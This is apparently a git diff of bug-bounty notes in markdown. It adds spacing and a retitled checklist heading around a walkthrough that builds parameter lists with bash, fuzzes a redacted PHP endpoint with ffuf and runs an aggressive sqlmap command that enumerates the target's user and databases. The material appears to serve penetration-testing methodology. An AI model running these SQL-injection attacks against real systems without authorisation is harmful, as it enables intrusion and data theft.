@@ -65,7 +65,7 @@
 </p>
 </details>
 
-## Specific Buf List:
+## Specific Vulnerability Check list List:
 	
 - [ ] Authentication
 - [ ] OAuth authentication
@@ -85,17 +85,25 @@ OK let’s do some bash to grep the names after get to make a list of parameters
 **Getting Parameters**
 
 ```$ cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u```
+
 remove the .php string to make a list - ```cut -f1 -d”.”```
+
 ```$ cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d”.” | sort -u```
+
 ```$ cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d”.” | sed 's/[A-Z]\+/\n&/g' | sort -u | tee uppercase-param.txt```
+
 ```$ cat php-files.txt| grep -i get | sed 's/.*.get//' | cut -f1 -d”.” | sed 's/[A-Z]\+/\n&/g' | sort -u | tr '[:upper:]' '[:lower:]' > lowercase-param.txt```
+	
 so now we have two lists of parameters let’s test it with FFUF, firstly I’ll grep endpoint and test all params with it, I’ll try the lowercase-parameters first with this command:
+
 ```ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"```
 If you don't get anything: Try with POST request
 ```ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"```
+
 Ok now go to the endpoint and intercept the request with burp and change the request method, add the parameter, and copy it to a txt file to run sqlmap on it.
 
 SQL:Command:
+
 ```sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast```
 [Refrer](https://infosecwriteups.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-2824cd4dfab)
 </p></details>
